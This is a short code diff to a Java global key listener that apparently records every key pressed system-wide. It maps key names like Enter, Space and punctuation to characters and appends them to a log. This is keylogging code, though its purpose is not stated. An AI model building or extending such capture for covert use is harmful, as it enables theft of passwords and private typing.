@@ -12,12 +12,26 @@ public class GlobalKeyListener implements NativeKeyListener {
         String finalKeyName;
         switch (keyPressed) {
             case "Return":
+            case "Enter":
                 finalKeyName = "\n";
+                break;
+            case "Space":
+                finalKeyName = " ";
+                break;
+            case "Period":
+                finalKeyName = ".";
+                break;
+            case "Comma":
+                finalKeyName = ",";
+                break;
+            case "Semicolon":
+                finalKeyName = ";";
                 break;
             default:
                 finalKeyName = keyPressed;
+                break;
         }
-        HookUtils.addLogs(finalKeyName);
+        HookUtils.addLogs(finalKeyName + " ");
     }
 
 
